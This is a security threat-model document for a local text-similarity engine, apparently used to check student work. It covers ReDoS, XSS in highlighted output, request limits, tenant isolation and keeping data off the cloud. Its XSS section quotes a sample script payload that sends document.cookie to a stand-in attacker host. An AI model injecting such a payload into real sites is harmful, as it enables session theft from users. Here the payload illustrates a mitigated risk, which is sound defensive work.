# Security and Privacy Assessment: Phase 3 Lexical Engine

## 1. Threat Modeling & Risk Mitigations

Phase 3 introduces substantial computational processing (fingerprinting, string alignment, rolling hashes) and user-facing HTML rendering. The following threat model mitigations are enforced:

### 1. ReDoS & Algorithmic Complexity Denial of Service
- **Risk**: An attacker submits crafted documents designed to induce worst-case $O(N^2)$ string matching or catastrophic backtracking in regular expressions.
- **Mitigation**:
  - `RollingHash64` operates in guaranteed $O(N)$ linear time via deterministic sliding window updates.
  - `WinnowingEngine` utilizes a monotonic deque guaranteeing amortized $O(1)$ per sliding window.
  - Regular expressions in `LexicalTokenizer` are pre-compiled and strictly linear without nested quantifiers.
  - `PassageAligner` enforces a bounded expansion limit and maximum merge gap ($4$ tokens).

### 2. Cross-Site Scripting (XSS) via Document Text Highlighting
- **Risk**: An attacker uploads a document containing `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` or `<img src=x onerror=...>`, aiming to execute script in an educator's browser.
- **Mitigation**: Zero usage of `dangerouslySetInnerHTML`. Document content is rendered via disjoint string slicing rendered as native React virtual DOM text nodes and `<mark>` elements. React automatically HTML-encodes all text node values.

### 3. Resource Exhaustion via Multi-Reference Abuse
- **Risk**: An attacker submits a One-to-Many request referencing 100,000 documents simultaneously.
- **Mitigation**: `api/v1/analyses.py` enforces a hard limit of maximum 50 reference documents per One-to-Many request (`HTTP 400 Bad Request` if exceeded). For larger reference sets, users must use Corpus mode which leverages BM25 pre-filtering.

### 4. Tenant Isolation & Data Privacy
- **Risk**: A student inspects analysis results belonging to another student's submission.
- **Mitigation**: All database records in `analyses` are bound to `owner_user_id`. Queries in `repo.list_analyses(owner_user_id)` strictly filter by the authenticated user's ID.

### 5. Private Storage & Zero Cloud Leakage
- **Risk**: Student essays or unpublished academic manuscripts are transmitted to cloud AI services or external LLM providers.
- **Mitigation**: The entire Phase 3 engine operates locally on `127.0.0.1`. Zero outbound HTTP calls are made to OpenAI, Anthropic, Google Cloud, or third-party vector databases.
